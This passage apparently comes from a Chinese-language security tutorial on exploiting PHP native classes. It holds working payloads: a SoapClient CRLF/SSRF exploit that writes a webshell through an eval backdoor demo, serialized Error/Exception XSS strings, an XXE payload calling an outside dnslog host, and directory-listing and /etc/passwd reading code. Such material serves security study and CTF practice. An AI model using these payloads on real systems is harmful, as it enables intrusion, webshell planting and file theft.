    <span class="token keyword">public</span> <span class="token function">__soapCall</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$args</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">,</span> <span class="token class-name">SoapHeader</span><span class="token operator">|</span><span class="token keyword type-declaration">array</span><span class="token operator">|</span><span class="token keyword type-declaration">null</span> <span class="token variable">$inputHeaders</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">array</span> <span class="token operator">&amp;</span><span class="token variable">$outputHeaders</span> <span class="token operator">=</span> <span class="token constant">null</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">mixed</span>
<span class="token punctuation">&#125;</span></code></pre>

<p><strong>use</strong></p>
<ul>
<li><code>SoapClient::__construct ( string|null $wsdl , array $options = [] )</code><ul>
<li><code>$wsdl</code>：wsdl文件的uri，如果是NULL意味着不使用WSDL模式。</li>
<li><code>$options</code>：如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li>
</ul>
</li>
<li><code>SoapClient::__call ( string $name , array $args ) : mixed</code></li>
</ul>
<p>官方的<code>$option</code>参数中有这样的一条介绍</p>
<pre class="language-none"><code class="language-none">The user_agent option specifies string to use in User-Agent header.</code></pre>

<p>我们可以自己设置<code>User-Agent</code>的值。当我们可以控制User-Agent的值时，也就意味着我们完全可以构造一个POST请求，因为<code>Content-Type</code>和<code>Content-Length</code>都在<code>User-Agent</code>之下，而控制这两个是利用<code>CRLF</code>发送POST请求最关键的地方。</p>
<p><strong>Demo</strong></p>
<p><a href="https://learnku.com/laravel/t/3905/do-you-really-know-ip-how-do-php-get-the-real-user-ip"><code>$_SERVER[&#39;REMOTE_ADDR&#39;]参考</code></a></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    @<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p><strong>Exp</strong></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$target</span><span class="token operator">=</span> <span class="token string single-quoted-string">'http://127.0.0.1/demo.php'</span><span class="token punctuation">;</span>
<span class="token variable">$post_string</span><span class="token operator">=</span> <span class="token string single-quoted-string">'1=file_put_contents("shell.php", "&lt;?php phpinfo();?>");'</span><span class="token punctuation">;</span>
<span class="token variable">$headers</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
   <span class="token string single-quoted-string">'X-Forwarded-For:127.0.0.1'</span><span class="token punctuation">,</span>
   <span class="token string single-quoted-string">'Cookie:admin=1'</span>
   <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location'</span><span class="token operator">=></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'user_agent'</span><span class="token operator">=></span><span class="token string single-quoted-string">'wupco^^Content-Type:application/x-www-form-urlencoded^^'</span><span class="token operator">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^Content-Length:'</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^^^'</span><span class="token operator">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span><span class="token string double-quoted-string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//因为User-agent是可以控制的，因此可以利用crlf注入http头部发送post请求</span>
<span class="token variable">$aaa</span><span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$aaa</span><span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%0d%0a'</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$aaa</span><span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%26'</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$aaa</span><span class="token punctuation">;</span>

<span class="token variable">$x</span><span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//调用__call方法触发网络请求发送</span>
<span class="token variable">$x</span><span class="token operator">-></span><span class="token function">no_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521214101395.png" alt loading="lazy"></p>
<p>成功写shell</p>
<h3 id="Error-Exception"><a href="#Error-Exception" class="headerlink" title="Error/Exception"></a>Error/Exception</h3><p>XSS</p>
<p><strong>range</strong>：<code>Error(php7, PHP8), Exception(php5, php7, PHP8)</code></p>
<p>通过内置<code>__toString()</code>魔术方法触发。</p>
<p><strong>Demo</strong></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span></span></code></pre>

<p><strong>Error Class Exp</strong></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">#注意版本是PHP7</span></span></code></pre>

<p><strong>Payload</strong></p>
<pre class="language-none"><code class="language-none">O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A52%3A%22D%3A%5CDesktopFolder%5CCode%5CPhpCode%5CPhpStorm%5Ctest%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521215011423.png" alt loading="lazy"></p>
<p><strong>Exception Class Exp</strong></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
　　<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;script>alert(1)&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
　　<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre>

<p><strong>Payload</strong></p>
<pre class="language-none"><code class="language-none">O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A52%3A%22D%3A%5CDesktopFolder%5CCode%5CPhpCode%5CPhpStorm%5Ctest%5Ctest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521215327661.png" alt loading="lazy"></p>
<h3 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h3><p>XXE</p>
<p><strong>range</strong>：<code>(PHP 5, PHP 7, PHP 8)</code></p>
<p>利用实例化该类的对象来传入xml代码进行xxe攻击，进而读取文件内容和命令执行。</p>
<p><strong>payload</strong></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span>
<span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string double-quoted-string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string double-quoted-string">"utf-8"</span> <span class="token delimiter important">?></span></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span> <span class="token punctuation">[</span><span class="token internal-subset">
    &lt;!ENTITY % remote SYSTEM "http://suhk4i.dnslog.cn">%remote;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
]>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span>&amp;xee<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span>
EOF;
$xml_class = new SimpleXMLElement($xml, LIBXML_NOENT);
var_dump($xml_class);
?></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521220408864.png" alt loading="lazy"></p>
<h3 id="SPL-File-Class"><a href="#SPL-File-Class" class="headerlink" title="SPL File Class"></a>SPL File Class</h3><h4 id="可遍历目录类"><a href="#可遍历目录类" class="headerlink" title="可遍历目录类"></a>可遍历目录类</h4><p><strong>DirectoryIterator</strong></p>
<p><strong>range</strong>：<code>(PHP 5, PHP 7, PHP 8)</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 不加__toString()也可,因为echo可以自动调用</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521224348452.png" alt loading="lazy"></p>
<p><strong>FilesystemIterator</strong></p>
<p><strong>range</strong>：<code>(PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilesystemIterator</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">#payload : cmd=glob:///*</span></span></code></pre>

<p><strong>GlobIterator</strong></p>
<p><strong>range</strong>：<code>(PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GlobIterator</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">#payload : cmd=glob:///*</span></span></code></pre>

<h4 id="可读取文件类"><a href="#可读取文件类" class="headerlink" title="可读取文件类"></a>可读取文件类</h4><p><strong>SplFileObject</strong></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$context</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SplFileObject</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$context</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20210521225031747.png" alt loading="lazy"></p>
<h3 id="ZipArchive-open"><a href="#ZipArchive-open" class="headerlink" title="ZipArchive::open()"></a>ZipArchive::open()</h3><p>可进行文件删除操作</p>
<p><strong>range</strong>：<code>PHP 5 &gt;= 5.2.0, PHP 7, PHP 8, PECL zip &gt;= 1.1.0</code></p>
<pre class="language-php" data-language="php"><code class="language-php">ZipArchive <span class="token punctuation">&#123;</span>
    <span class="token comment">/* 方法 */</span>
    <span class="token keyword">public</span> <span class="token function">addEmptyDir</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$dirname</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">addFile</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$filepath</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$entryname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token class-name static-context">ZipArchive</span><span class="token operator">::</span><span class="token constant">FL_OVERWRITE</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">addFromString</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$content</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token class-name static-context">ZipArchive</span><span class="token operator">::</span><span class="token constant">FL_OVERWRITE</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">addGlob</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$pattern</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>
    <span class="token keyword">public</span> <span class="token function">addPattern</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$pattern</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"."</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">array</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>
    <span class="token keyword">public</span> <span class="token function">close</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">count</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">int</span>
    <span class="token keyword">public</span> <span class="token function">deleteIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">deleteName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token function">extractTo</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$destination</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">mixed</span> <span class="token variable">$entries</span> <span class="token operator">=</span> <span class="token operator">?</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">getArchiveComment</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>
    <span class="token keyword">public</span> <span class="token function">getCommentIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>
    <span class="token keyword">public</span> <span class="token function">getCommentName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>
    <span class="token keyword">public</span> <span class="token function">GetExternalAttributesIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$opsys</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$attr</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token operator">?</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">getExternalAttributesName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$opsys</span> <span class="token punctuation">,</span> <span class="token keyword type-declaration">int</span> <span class="token operator">&amp;</span><span class="token variable">$attr</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">getFromIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>
    <span class="token keyword">public</span> <span class="token function">getFromName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>
    <span class="token keyword">public</span> <span class="token function">getNameIndex</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$index</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>
    <span class="token keyword">public</span> <span class="token function">getStatusString</span> <span class="token punctuation">(</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span>
    <span class="token keyword">public</span> <span class="token function">getStream</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token class-name">resource</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token function">isCompressionMethodSupported</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">bool</span> <span class="token variable">$enc</span> <span class="token operator">=</span> <span class="token constant boolean">true</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token function">isEncryptionMethodSupported</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">int</span> <span class="token variable">$method</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">bool</span> <span class="token variable">$enc</span> <span class="token operator">=</span> <span class="token constant boolean">true</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">locateName</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$name</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">int</span><span class="token operator">|</span><span class="token keyword type-declaration">false</span>
    <span class="token keyword">public</span> <span class="token function">open</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$filename</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">int</span> <span class="token variable">$flags</span> <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token operator">|</span><span class="token keyword type-declaration">int</span>
    <span class="token keyword">public</span> <span class="token function">registerCancelCallback</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">callable</span> <span class="token variable">$callback</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
    <span class="token keyword">public</span> <span class="token function">registerProgressCallback</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">float</span> <span class="token variable">$rate</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">callable</span> <span class="token variable">$callback</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">bool</span>
